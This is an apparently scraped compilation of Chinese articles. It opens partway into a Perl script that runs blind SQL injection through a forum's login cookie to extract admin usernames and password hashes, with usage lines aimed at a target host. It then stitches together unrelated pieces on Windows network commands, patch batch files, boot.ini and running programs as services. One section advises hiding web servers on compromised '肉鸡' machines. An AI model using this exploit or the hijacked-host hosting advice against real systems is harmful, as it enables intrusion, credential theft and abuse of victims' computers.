$target = "ilikecat'%20and%20exists%20(select%20id%20from%20[admin]%20where%20id=$id[$j]%20and%20left(username,$k)='$key')%20and%20'1'='1";
&second;
if ("@in" !~ /ilikecat/) {
$th=$k.th;
print "\n--------->>The $th word of $id[$j] username is $dic[$i]";
$pws=$pws.$dic[$i];
last USERNAME;
}
if ($dic[$i] eq "z") {
print "\ni can't crack this admin's name,maybe it is chinese.\n";
push (@user,"\?");
last OUTER;
}
}
}
push (@user,$pws);
print "\n========>>The username is $pws which id is $id[$j]\n";
}
print "\n\#\#\#\#\#\#\#\#\#\#\#End Crackadmin's username...\n";
sleep(2);

#Crack admin's password
print "\n\#\#\#\#\#\#\#\#\#\#\#Start Crackadmin's password...\n";
@dic1=(0..9);
@dic2=(a..f);
@dic=(@dic1,@dic2);
for ($j=0;$j<@id;$j++) {
$pws="";
print " \|\-\>cracking password which id is $id[$j] ...";
for ($k=1;$k<=16;$k++) {
&first;
PASSWORD: for ($i=0;$i<@dic;$i++) {
print "$dic[$i].";
$key=$pws.$dic[$i];
$target = "ilikecat'%20and%20exists%20(select%20id%20from%20[admin]%20where%20id=$id[$j]%20and%20left(password,$k)='$key')%20and%20'1'='1";
&second;
if ("@in" !~ /ilikecat/) {
$th=$k.th;
print "\n--------->>The $th word of $id[$j] password is $dic[$i]";
$pws=$pws.$dic[$i];
last PASSWORD;
}
}
}
push (@pass,$pws);
print "\n\n========>>The password is $pws which id is $id[$j]\n\n";
}
print "\#\#\#\#\#\#\#\#\#\#\#End Crackadmin's password...\n\n";
print "We got them now:\n";
printf("%-4s %-20s %-16s\n",ID,UserName,PassWord);
for ($i=0;$i<@id;$i++) {
printf("%-4d %-20s %-16s\n",$id[$i],$user[$i],$pass[$i]);
}
}

else {
&usage;
}

sub first {
$str="username=ilikecat&password=catlikeme&CookieDate=1";
$len=length($str);
$req = "GET $path/login.asp?action=chk&username=ilikecat&password=catlikeme HTTP/1.1\n".
"Referer: http://$host$path/login.asp\n".
"Host: $host\n".
"Content-Length: $len\n".
"Cookie: aspsky=usercookies=&userid=&userclass=&username=&userhidden=&password=; iscookies=0; BoardList=BoardID=Show;upNum=0\n".
"\n".
"$str\n\n";
print "\n.";
sendraw($req);
$req0 = "GET $path/index.asp HTTP/1.0\n".
"Referer: http://$host$path/index.asp\n".
"Host: $host\n".
"Cookie: aspsky=userid=$userid&usercookies=0&userhidden=2&password=aac9ac496fa5ea8e&userclass=%D0%C2%CA%D6%C9%CF%C2%B7&username=ilikecat; iscookies=0; BoardList=BoardID=Show; upNum=0\n\n";
print ".\n";
sendraw($req0);
}

sub second {
$req1 = "GET $path/logout.asp HTTP/1.0\n".
"Host: $host\n".
"Cookie: aspsky=userid=$userid&usercookies=1&userhidden=2&username=$target; iscookies=0; BoardList=BoardID=Show; \n\n";
print ".";
@res = sendraw($req1);
$req2 = "GET $path/index.asp?action=show HTTP/1.0\n".
"Referer: http://$host$path/index.asp?action=show \n".
"Host: $host\n".
"Cookie: aspsky=usercookies=&userid=&userclass=&username=&userhidden=&password=; iscookies=0; BoardList=BoardID=Show; upNum=0\n\n";
print ".";
@in = sendraw($req2);
}

sub usage {
print qq~
Usage: $0 -h <Host> [-p <port>] -w <path> -i <userid> -m <mode> [-u <user>]
-h =hostname you want to attack
-p =port,80 default
-w =the web path such as "/dvbbs"
-i =the userid of ilikecat
-m =only two choice,b<background> and p<proscenium>(This option need -u)
-u =the user you want to crack
Eg: 1.Crack proscenium 
$0 -h www.target.com -p 80 -w /dvbbs -i 2 -m p -u admin 
2.Crack background
$0 -h www.target.com -p 80 -w /dvbbs -i 2 -m b
~;
exit;
}

sub sendraw { 
my ($req) = @_; 
my $target; 
$target = inet_aton($host) || die("inet_aton problems\n"); 
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || die("Socket problems\n"); 
if(connect(S,pack "SnA4x8",2,$port,$target)){ 
select(S); 
$| = 1; 
print $req; 
my @res = <S>; 
select(STDOUT);
close(S); 
return @res;
}
else { 
die("Can't connect...\n"); 
}
} 




【网络最经典命令行－网络安全工作者的必杀技】
1.最基本，最常用的，测试物理网络的 

　　ping 192.168.0.8 －t ，参数－t是等待用户去中断测试 

    2.查看DNS、IP、Mac等 

　　A.Win98：winipcfg 
　　B.Win2000以上：Ipconfig/all 

　　C.NSLOOKUP：如查看河北的DNS 
　　C:\>nslookup 
　　Default Server: ns.hesjptt.net.cn 
　　Address: 202.99.160.68 
　　>server 202.99.41.2 则将DNS改为了41.2 
　　> pop.pcpop.com 
　　Server: ns.hesjptt.net.cn 
　　Address: 202.99.160.68 

　　Non-authoritative answer: 
　　Name: pop.pcpop.com 
　　Address: 202.99.160.212 

    3.网络信使  

　　Net send 计算机名/IP　* (广播) 传送内容，注意不能跨网段 
　　net stop messenger 停止信使服务，也可以在面板－服务修改 
　　net start messenger 开始信使服务 

    4.探测对方对方计算机名，所在的组、域及当前用户名 （追捕的工作原理） 

　　ping －a IP －t ，只显示NetBios名 
　　nbtstat -a 192.168.10.146 比较全的 

    5.netstat -a 显示出你的计算机当前所开放的所有端口 

　　netstat -s -e 比较详细的显示你的网络资料，包括TCP、UDP、ICMP 和 IP的统计等 

    6.探测arp绑定（动态和静态）列表，显示所有连接了我的计算机，显示对方IP和MAC地址 

　　arp -a 

    7.在代理服务器端 

　　捆绑IP和MAC地址，解决局域网内盗用IP！： 
　　ARP －s 192.168.10.59 00 －50－ff－6c－08－75 
　　解除网卡的IP与MAC地址的绑定： 
　　arp -d 网卡IP 

    8.在网络邻居上隐藏你的计算机 

　　net config server /hidden:yes 
　　net config server /hidden:no 则为开启 

    9.几个net命令 

　　A.显示当前工作组服务器列表 net view，当不带选项使用本命令时，它就会显示当前域或网络上的计算机上的列表。 
　　比如：查看这个IP上的共享资源，就可以 
　　C:\>net view 192.168.10.8 
　　在 192.168.10.8 的共享资源 
　　资源共享名 类型 用途 注释 
　　-------------------------------------- 
　　网站服务 Disk 
　　命令成功完成。 

　　B.查看计算机上的用户帐号列表 net user 
　　C.查看网络链接 net use 
　　例如：net use z: \192.168.10.8\movie 将这个IP的movie共享目录映射为本地的Z盘 
　　D.记录链接 net session 
　　例如: C:\>net session 
　　计算机 用户名 客户类型 打开空闲时间 
　　------------------------------------------------------------------------------- 
　　\192.168.10.110 ROME Windows 2000 2195 0 00:03:12 

　　\192.168.10.51 ROME Windows 2000 2195 0 00:00:39 
　　命令成功完成。 

    10.路由跟踪命令 

　　A.tracert pop.pcpop.com 
　　B.pathping pop.pcpop.com 除了显示路由外，还提供325S的分析，计算丢失包的％ 

    11.关于共享安全的几个命令 

　　A.查看你机器的共享资源 net share 
　　B.手工删除共享（可以编个bat文件，开机自运行，把共享都删了！） 
　　net share c$ /d 
　　net share d$ /d 
　　net share ipc$ /d 
　　net share admin$ /d 
　　注意$后有空格。 
　　C.增加一个共享： 
　　c:\net share mymovie=e:\downloads\movie /users:1 
　　mymovie 共享成功。 
　　同时限制链接用户数为1人。 

    12.在DOS行下设置静态IP 

　　A.设置静态IP 
　　CMD 
　　netsh 
　　netsh>int 
　　interface>ip 
　　interface ip>set add "本地链接" static IP地址 mask gateway 
　　B.查看IP设置 
　　interface ip>show address 

　　Arp 
　　显示和修改“地址解析协议 (ARP)”缓存中的项目。ARP 缓存中包含一个或多个表，它们用于存储 IP 地址及其经过解析的以太网或令牌环物理地址。计算机上安装的每一个以太网或令牌环网络适配器都有自己单独的表。如果在没有参数的情况下使用，则 arp 命令将显示帮助信息。 

　　语法 
　　arp [-a [InetAddr] [-N IfaceAddr]] [-g [InetAddr] [-N IfaceAddr]] [-d InetAddr [IfaceAddr]] [-s   InetAddr EtherAddr [IfaceAddr]] 

　　参数 
　　-a [InetAddr] [-N IfaceAddr] 
　　显示所有接口的当前 ARP 缓存表。要显示指定 IP 地址的 ARP 缓存项，请使用带有 InetAddr 参数的 arp -a，此处的 InetAddr 代表指定的 IP 地址。要显示指定接口的 ARP 缓存表，请使用 -N IfaceAddr 参数，此处的 IfaceAddr 代表分配给指定接口的 IP 地址。-N 参数区分大小写。 
　　-g [InetAddr] [-N IfaceAddr] 
　　与 -a 相同。 
　　-d InetAddr [IfaceAddr] 
　　删除指定的 IP 地址项，此处的 InetAddr 代表 IP 地址。对于指定的接口，要删除表中的某项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。要删除所有项，请使用星号 (*) 通配符代替 InetAddr。 
　　-s InetAddr EtherAddr [IfaceAddr] 
　　向 ARP 缓存添加可将 IP 地址 InetAddr 解析成物理地址 EtherAddr 的静态项。要向指定接口的表添加静态 ARP 缓存项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。 
　　/? 
　　在命令提示符显示帮助。 
　　注释 
　　InetAddr 和 IfaceAddr 的 IP 地址用带圆点的十进制记数法表示。 
　　物理地址 EtherAddr 由六个字节组成，这些字节用十六进制记数法表示并且用连字符隔开（比如，00-AA-00-4F-2A-9C）。 
　　通过 -s 参数添加的项属于静态项，它们不会 ARP 缓存中超时。如果终止 TCP/IP 协议后再启动，这些项会被删除。要创建永久的静态 ARP 缓存项，请在批处理文件中使用适当的 arp 命令并通过“计划任务程序”在启动时运行该批处理文件。 
只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
　　范例 
　　要显示所有接口的 ARP 缓存表，可键入： 

　　arp -a 

　　对于指派的 IP 地址为 10.0.0.99 的接口，要显示其 ARP 缓存表，可键入： 

　　arp -a -N 10.0.0.99 

　　要添加将 IP 地址 10.0.0.80 解析成物理地址 00-AA-00-4F-2A-9C 的静态 ARP 缓存项，可键入： 

　　arp -s 10.0.0.80 00-AA-00-4F-2A-9C 

　　At 
　　计划在指定时间和日期在计算机上运行命令和程序。at 命令只能在“计划”服务运行时使用。如果在没有参数的情况下使用，则 at 列出已计划的命令。 

　　语法 
　　at [\ComputerName] [{[ID] [/delete]　/delete [/yes]}] 

　　at [[\ComputerName] hours:minutes [/interactive] [{/every:date[,...]　/next:date[,...]}] command] 

　　参数 
　　 \computername 
　　指定远程计算机。如果省略该参数，则 at 计划本地计算机上的命令和程序。 
　　ID 
　　指定指派给已计划命令的识别码。 
　　/delete 
　　取消已计划的命令。如果省略了 ID，则计算机中所有已计划的命令将被取消。 
　　/yes 
　　删除已计划的事件时，对来自系统的所有询问都回答“是”。 
　　hours:minutes 
　　指定命令运行的时间。该时间用 24 小时制（即从 00:00 [午夜] 到 23:59）的 小时: 分钟格式表示。 
　　/interactive 
　　对于在运行 command 时登录的用户,允许 command 与该用户的桌面进行交互。 
　　/every: 
　　在每个星期或月的指定日期（例如，每个星期四，或每月的第三天）运行 command 命令。 
　　date 
　　指定运行命令的日期。可以指定一周的某日或多日（即，键入 M、T、W、Th、F、S、Su）或一个月中的某日或多日（即，键入从 1 到31 之间的数字）。用逗号分隔多个日期项。如果省略了 date，则 at 使用该月的当前日。 
　　/next: 
　　在下一个指定日期（比如，下一个星期四）到来时运行 command。 
　　command 
　　指定要运行的 Windows 命令、程序（.exe 或 .com 文件）或批处理程序（.bat 或 .cmd 文件）。当命令需要路径作为参数时，请使用绝对路径，也就是从驱动器号开始的整个路径。如果命令在远程计算机上，请指定服务器和共享名的通用命名协定 (UNC) 符号，而不是远程驱动器号。 
　　/? 
　　在命令提示符显示帮助。 
　　注释 
　　Schtasks 是功能更为强大的超集命令行计划工具，它含有 at 命令行工具中的所有功能。对于所有的命令行计划任务，都可以使用 schtasks 来替代 at。有关 schtasks 的详细信息，请参阅“相关主题”。 

　　使用 at 
　　使用 at 命令时，要求您必须是本地 Administrators 组的成员。



【肉鸡架设空间上传什么web服务器不被发现】
我在这里先介绍两款超小型的web服务器。
1：Small HTTP Server v3.039 
运行环境： Win95/Win98/Win2000
大小：93K（小得惊人!!!） 
内容简介： 很小巧的 WEB 服务器，占用资源很小，支持 CGI1.1、SSI、PHP。 
下载地址http://61.13.12.138/iis/small_http3.zip
软件简介下载完以后有两个文件夹：一个可执行文件和一个注册码文件
双击可执行文件就可以安装。
在弹出的窗口最上面是版权说明。
我们只用在选 "I agree with this license.adn i acce"(同意协议)
选择安装目录。（默认就可以了）
输入用户名和密码。点install就可以完成安装。
假设安装在c:\shttps目录下。
安装完成后c:\shttps下面会生成dese.htm http.cfg(这个是配置文件。里面存放着你的用户名。系统目录等信息。)。http.exe(这个是主文件执行后你的电脑就是一台简单的web服务器了)。license.txt说明文件。
如果你想让你的服务器支持cgi.ssi.php。请参看license.txt和dese.htm文件（我E文太差看不懂）
把你的主页放进这个目录就可以了。
本人只在网吧简单的试了一下如果大家在使用时有什么新的心得请与我联系：）

2:软件名称： 东方自由主机(Easyhost) v1.0 
文件大小： 217KB 
更新日期： 2002-10-18 
运行环境： Win9x/NT4/2000/XP 
软件性质： 共享 
本地下载： 下载地址软件名称： 东方自由主机(Easyhost) v1.0 
文件大小： 217KB 
更新日期： 2002-10-18 
运行环境： Win9x/NT4/2000/XP 
软件性质： 共享 
本地下载： 下载地http://61.13.12.138/iis/easyhost.zip
内容简介： 全**的联网PC客户端WEB服务器，将您的普通办公或家庭电脑变成一台可以向全世界提供WWW网站服务的真实主机。您可以随时自由地向外界发布您的公司、个人主页，并无需为空间不够而发愁，因为它提供海量数据下载，您的硬盘有多大就能拥有多大的WEB主机空间。特别适合于不定期、即时性网站发布以及下载数据容量较大场合使用。 

内容简介： 全**的联网PC客户端WEB服务器，将您的普通办公或家庭电脑变成一台可以向全世界提供WWW网站服务的真实主机。您可以随时自由地向外界发布您的公司、个人主页，并无需为空间不够而发愁，因为它提供海量数据下载，您的硬盘有多大就能拥有多大的WEB主机空间。特别适合于不定期、即时性网站发布以及下载数据容量较大场合使用。 
将文件解压后执行就可以了完全绿色软件
此软件有不少实用功能：）
a:支持**域名带有一个x.yeah.net和x.126.com**域名申请的连接。真是体贴周到：）
b.可以修订首页。
c:自己写义端口
d:这么一款web服务器竟名还带有日志记录的功能
要说明的是这款服务器安装得重启系统。我用的是98测试不知道2000会是怎么样？
这款服务器用于肉鸡上。改一下端口。再把它注册成服务。 一定是个不错的先择：）


【补丁一键安装批处理】
szy106 2006-1-18 01:40 

 
对于分文件夹存放的补丁的批处理写法,无非是把KB******.exe这样的根目录写法换成是X:\>大目录名\子目录名\KB******.exe /q/n 即可 

 
自己做的话可以参考一下这个。。。

winXP SP2 后35个关键补丁一键安装批处理编写源代码

@echo off
echo          **************************************************************
echo          *                                                            *
echo          *   Windows XP SP2 后所有35个关键补丁和2个非关键补丁包合集   *
echo          *                                                            *
echo          *            Build By Bluekiller 2005-12-15                  *
echo          *                                                            *
echo          **************************************************************
echo.
echo.
echo 正在安装 Windows XP KB873339 安全更新包(1 of 35)...
echo off
873339.exe /quiet /norestart
echo Windows XP KB873339 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB885250 安全更新包(2 of 35)...
echo off
885250.exe /quiet /norestart
echo Windows XP KB885250 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB885835 安全更新包(3 of 35)...
echo off
885835.exe /quiet /norestart
echo Windows XP KB885835 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB885836 安全更新包(4 of 35)...
echo off
885836.exe /quiet /norestart
echo Windows XP KB885836 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB886185 安全更新包(5 of 35)...
echo off
886185.exe /quiet /norestart
echo Windows XP KB886185 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB886677 安全更新包(6 of 35)...
echo off
886677.exe /quiet /norestart
echo Windows XP KB886677 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB887472 安全更新包(7 of 35)...
echo off
887472.exe /quiet /norestart
echo Windows XP KB887472 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB887742 安全更新包(8 of 35)...
echo off
887742.exe /quiet /norestart
echo Windows XP KB887742 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB888113 安全更新包(9 of 35)...
echo off
888113.exe /quiet /norestart
echo Windows XP KB888113 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB888302 安全更新包(10 of 35)...
echo off
888302.exe /quiet /norestart
echo Windows XP KB888302 安全更新包安装完成.
echo. 

@echo off
echo 正在安装 Windows XP KB890046 安全更新包(11 of 35)...
echo off
890046.exe /quiet /norestart
echo Windows XP KB890046 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB890830 Removal Tools 12月安全更新包(12 of 35)...
echo off
890830.exe /quiet
echo Windows XP KB890830 Removal Tools 12月安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB890859 安全更新包(13 of 35)...
echo off
890859.exe /quiet /norestart
echo Windows XP KB890859 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB891781 安全更新包(14 of 35)...
echo off
891781.exe /quiet /norestart
echo Windows XP KB891781 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB893066 安全更新包(15 of 35)...
echo off
893066.exe /quiet /norestart
echo Windows XP KB893066 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB893756 安全更新包(16 of 35)...
echo off
893756.exe /quiet /norestart
echo Windows XP KB893756 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB894391 安全更新包(17 of 35)...
echo off
894391.exe /quiet /norestart
echo Windows XP KB894391 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896358 安全更新包(18 of 35)...
echo off
896358.exe /quiet /norestart
echo Windows XP KB896358 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896422 安全更新包(19 of 35)...
echo off
896422.exe /quiet /norestart
echo Windows XP KB896422 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896423 安全更新包(20 of 35)...
echo off
896423.exe /quiet /norestart
echo Windows XP KB896423 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896424 安全更新包(21 of 35)...
echo off
896424.exe /quiet /norestart
echo Windows XP KB896424 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896428 安全更新包(22 of 35)...
echo off
896428.exe /quiet /norestart
echo Windows XP KB896428 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB896688 安全更新包(23 of 35)...
echo off
896688.exe /quiet /norestart
echo Windows XP KB896688 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB899587 安全更新包(24 of 35)...
echo off
899587.exe /quiet /norestart
echo Windows XP KB899587 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB899589 安全更新包(25 of 35)...
echo off
899589.exe /quiet /norestart
echo Windows XP KB899589 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB899591 安全更新包(26 of 35)...
echo off
899591.exe /quiet /norestart
echo Windows XP KB899591 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB900725 安全更新包(27 of 35)...
echo off
900725.exe /quiet /norestart
echo Windows XP KB900725 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB901017 安全更新包(28 of 35)...
echo off
901017.exe /quiet /norestart
echo Windows XP KB901017 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB901214 安全更新包(29 of 35)...
echo off
901214.exe /quiet /norestart
echo Windows XP KB901214 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB902400 安全更新包(30 of 35)...
echo off
902400.exe /quiet /norestart
echo Windows XP KB902400 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB904706 安全更新包(31 of 35)...
echo off
904706.exe /quiet /norestart
echo Windows XP KB904706 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB905414 安全更新包(32 of 35)...
echo off
905414.exe /quiet /norestart
echo Windows XP KB905414 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB9905749 安全更新包(33 of 35)...
echo off
905749.exe /quiet /norestart
echo Windows XP KB905749 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB905915 安全更新包(34 of 35)...
echo off
905915.exe /quiet /norestart
echo Windows XP KB905915 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB910437 安全更新包(35 of 35)...
echo off
910437.exe /quiet /norestart
echo Windows XP KB910437 安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB893803 （非关键）安全更新包(1 of 2)...
echo off
KB893803.exe /quiet /norestart
echo Windows XP KB893803 （非关键）安全更新包安装完成.
echo.

@echo off
echo 正在安装 Windows XP KB898461 （非关键）安全更新包(2 of 2)...
echo off
KB898461.exe /quiet /forcerestart
echo Windows XP KB898461 （非关键）安全更新包安装完成.
echo. 


【解读多重启动引导文件BOOT】
                   解读多重启动引导文件BOOT.ini
                      http://www.cnwill.com   


本文作者： 未知 文章录入：safer
文章出处： 未知 
阅读次数： 37
发布日期： 2003-10-23 
Windows NT类的*作系统，也就是Windows NT/2000/XP中，有一个特殊文件，也就是“BOOT.INI”文件，这个文件会很轻松地按照我们的需求设置好多重启动系统。 
“BOOT.INI”文件会在已经安装了Windows NT/2000/XP的*作系统的所在分区，一般默认为C:\下面存在。但是它默认具有隐藏和系统属性，所以你要设置你的文件夹选项，以便把“BOOT.INI”文件显示出来。我们可以用任何一种文本编辑器来打开他它。一般情况下，它的内容如下: 
[boot loader] 
timeout=30 
default=multi(0)disk(0)rdisk(0)partition(1)\Windows 
[operating systems] 
multi(0)disk(0)rdisk(0)partition(1)\Windows="Microsoft Windows XP Professional" /fastdetect 
　　在Windows 2000或者是XP系统中，我们可以很容易的设置“BOOT.INI”文件。那就是在“我的电脑”上面点击右键，选择“属性”打开“系统属性”对话框，再点击“高级”选项卡，在“启动和故障修复”里面点击“设置”按钮，就可以打开“启动和故障修复”对话框了，在这里面我们就可以对它进行详细设置。 
　　如果你拥有Windows XP*作系统，那么你可以用“系统配置实用程序”来更方便的编辑“BOOT.INI”文件。具体做法是:打开“开始”菜单，点击“运行”命令，再在弹出的文本框中输入“msconfig”点击“确定”后就会弹出“系统配置实用程序”，再点击“BOOT.INI”选项卡，就会出现如图所示的界面。在这里，我们可以很方便地设置文件。 
言归正传，现在，来说明一下这个文件内容的含义。 
　　1.系统加载部分（[boot loader]） 
　　这一部分很简单，只有两个设定。那就是“timeout=”和“default=”。 
“timeout=”就是设定开机时系统引导菜单显示的时间，超过设定值则自动加载下面“default=”指定的*作系统。默认值是30，单位为秒。我们可以在这里面设定等待时间的长短。如果将其设为“0”那么就是不显示系统引导菜单。 
　　“default=”则是设定默认引导的*作系统。而等号后面的*作系统必须是已经在“[operating systems]”中存在的。如果想默认为加载另外的*作系统，我们可以参看“[operating systems]”中的*作系统列表，然后把想要加载的*作系统按照格式写到“default=”后面就可以了。 
　　2.*作系统部分（[operating systems]） 
　　在这里面，列出了机器上所安装的全部*作系统。比如机器上只有一个*作系统，那么就只有一条信息，那就是“multi(0)disk(0)rdisk(0)partition(1)\Windows="Microsoft Windows XP Professional" /fastdetect” 
在这里需要注意的是，在英文引号内的文字就是引导*作系统菜单时显示出来的让我们选择*作系统的提示文字，在这里面我们可以随意更改。而“multi(0)disk(0)rdisk(0)partition(1) \Windows”这一句就需要些解释了。因为它涉及ARC（高级RISC计算机）命名，它是x86或RISC计算机中用于标识设备的动态方法。 
ARC命名的第一部分用于标识硬件适配卡/磁盘控制器，它有两个选项:SCSI和Multi。 
Multi表示一个非SCSI硬盘或一个由SCSI BIOS访问的SCSI硬盘，而SCSI则表示一个SCSI BIOS禁止的SCSI硬盘。(x)是硬件适配卡序号。Disk(x)表示SCSI总线号。如果硬件适配卡为Multi，其正确表示方法就为disk(0)，rdisk(x)则表示硬盘的序号，如果硬件适配卡为SCSI则忽略此值; 
　　partition(x)表示硬盘的分区序号。了解这些，我们就可以解释前面那条信息的含义了，即“multi(0)disk(0)rdisk(0)partition(1) \Windows”为，在0号非SCSI设备上的第0号磁盘上的第一个分区里面的“Windows”目录下可以找到能够启动的*作系统。 
　　等号后的内容前面已经说过，那个就是引导菜单显示出来的供我们选择的提示文字。而后面的“/fastdetect”又是作什么用的呢？这是一个开关符，用来控制启动该*作系统时的具体选项，下面再来详细的介绍各种开关符的含义: 
/3GB:这是Win2000 SP3新引入的。这使得用户区和系统区分为3G比1G的比例。只有用户使用NT企业版，应用程序也支持3GB选项时，此选项才生效。 
　　/BASEVIDEO:使用标准VGA方式启动。这种方式主要用于显示驱动程序失效时。 
　　/BAUDRATE:指出用于调度的波特率，如果用户不设置，则使用默认的9600，而对于线缆Modem则使用19200。 
　　/BOOTLOG:使Win2000将日志写入 %SystemRoot%\NTBTLOG.TXT 。 
　　/BURNMEMORY=:使NT在已知的内存上少使用指定的数量，如果/burnmemory=64，则有64M内存NT不使用。 
　　/CRASHDEBUG:调度器在NT启动时启动，只有在内核错误时才有用，如果系统经常会无故出错，这个选项就很有用了。 
　　/DEBUG:在启动NT时调入调度器，它可以在任何时间激活，在错误可以再次出现时使用它比较合适。 
　　/DEBUGPORT= comx :指定用于调度的端口，其它X就指端口号。 
　　/FASTDETECT:对于Win2000启动时，它使系统不检查串行口和并行口。 
　　/HAL=<hal>:允许用户不使用默认的HAL。 
　　/INTAFFINITY:设置多处理器HAL(HALMPS.DLL)，使编号最大的处理器接收中断请求。如果不设置此选项，Win2000会使所有处理器接收中断请求。 
　　/KERNEL=<kernel>:与上面的功能相同，不过是针对SMP中的内核而言的。 
　　/MAXMEM:n:指定NT可以使用的最大内存数，如果一个内存片损坏，这个开关就十分有用了。 
　　/NODEBUG:不使用调试信息。 
　　/NOGUIBOOT:指定此选项会使Win2000不加载VGA驱动程序，也就不会显示启动过程和失败时的兰屏信息。 
　　/NOSERIALMICE=[COMx | COMx,y,z…]:在特定的COM中上禁止对串行鼠标的检测。如果用户有一个非鼠标设备接在COM口上，这个选项会十分有用。如果此开关未加参数，系统会禁止所有COM口。 
　　/NUMPROC=n:只允许前N个系统处理器工作。 
　　/ONECPU:在多处理器中只使用一个处理器。 
　　/PCILOCK:不让NT为PCI设置分配IO/IRQ资源，而启用BIOS设置。 
　　/SAFEBOOT:安全启动，这个大家一定十分熟悉，Win2000只启动HKLM\System\CurrentControlSet\ 
Control\SafeBoot中的驱动程序和服务，其后跟三个参数MINIMAL，NETWORK或DSREPAIR之一。MINIMAL和NETWORK在允许网络下启动系统。而DSREPAIR要求系统从备份设备中调入活动目录的设置。还有一个选项是"(ALTERNATESHELL)"，它让系统调入由HKLM\System\CurrentControlSet\ 
SafeBoot\AlternateShell指定的SHELL程序，而不使用默认的Explorer。 
　　/SOS:在调入驱动程序名时显示它的名字，在因驱动问题而无法启动时使用比较好。 
　　/WIN95:在装有三个系统DOS、Win9x和Windows NT的系统上，让NTLDR直接调用Win9x。启动文件BOOTSECT.W40。 
　　/WIN95DOS:在装有三个系统DOS、Win9x和Windows NT的系统上，让NTLDR直接调用DOS启动文件BOOTSECT.DOS 
　　/YEAR=:使用指定的年份，如果设置为/YEAR=2005，那现在的时间就是2005年，此选项仅对NT4+SP4和Win2000生效。 
了解了以上这些，我们就可以更加轻松控制好我们系统的启动了。 


【让程序作为服务运行】
让程序作为服务运行 
  触网地带  http://www.ifeeling.net  

　　想让一个程序在启动系统的时候自动运行，你有什么好办法？添加到启动组？那如果别人删除掉就不管用了。如果你使用了Windows NT/2000/XP，就可以试试把这个程序添加为一个服务，这样只有拥有权限的人才可以更改服务，只要你设置好权限，就不用担心会被别人删除了。

　　要把应用程序添加为服务，你需要两个小软件：Instsrv.exe和Srvany.exe。

　　Instsrv.exe可以给系统安装和删除服务，Srvany.exe可以让程序以服务的方式运行。这两个软件都包含在Windows NT Resource Kit里。

　　把这两个程序保存在一个方便的位置，例如C盘根目录下。

　　我们举例来说明，把OE作为一个服务添加进Windows XP Professional操作系统中，并把这个服务命名为“Mail”。
　　
　　在运行中输入“CMD”，回车，打开命令行窗口，在提示符后面直接输入：“c:\instsrv.exe Mail c:\srvany.exe”然后回车，其中的“c:\instsrv.exe”和“c:\srvany.exe”表示这两个程序保存的位置，而Mail则是你想添加的服务名称。

　　运行Regedit打开注册表编辑器，在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services下，找到刚才添加的Mail，点击右键，新建一个键，命名为“Parameters”，点击新建的Parameters，并再次新建一个名称为“Application”的子键，数据类型为“REG_SZ”，数值为希望作为服务运行的程序的所在位置，如果你的Windows系统安装在C盘下，那么OE的程序位置就是C:\Program Files\Outlook Express\msimn.exe ，把这个路径添入数值中。

　　到现在，这个服务已经成功的添加并且设置好了。如果你希望做的更加专业，可以在Mail服务下建立一个名为Description的子键，数据类型同样为REG_SZ，数值可以写一些你对这个服务的描述，这个我们在后面可以看到。

　　接下来需要对服务做一些额外的设置，在运行中输入“Services.msc”并回车，在列表中找到我们刚添加的Mail服务，双击打开，来做详细的设置。

　　在“General”选项卡上，我们需要设置这个服务的运行方式，可以看见，作为一个服务，有“自动（Automatic）”，“手动（Manual）”和“禁止（Disabled）”三种启动类型，按照需要，我们一般设置成自动就可以了。而在“Logon”选项卡下可以设置以什么身份运行这个服务，一般可以不用理会，按照默认的设置。“Recovery”选项卡下则是进行恢复设置的，你可以指定，在服务第一次，第二次和第三次出错之后分别采取什么措施。“Dependencies”则显示了服务之间的依存关系，可以让你察看这个服务的运行依赖哪些其它服务，以及还有什么服务依赖于这个服务。这后面几个对我们一般用户没有什么意义。经过这些设置，你的服务已经完全可以正常工作了。

　　注销一下看看。为了让你看清除，我们先打开OE，这时在任务管理器里，有两个msimn进程，用户名为“.com.cn”的是我们打开的OE，而用户名为“SYSTEM”的就是我们添加的服务。

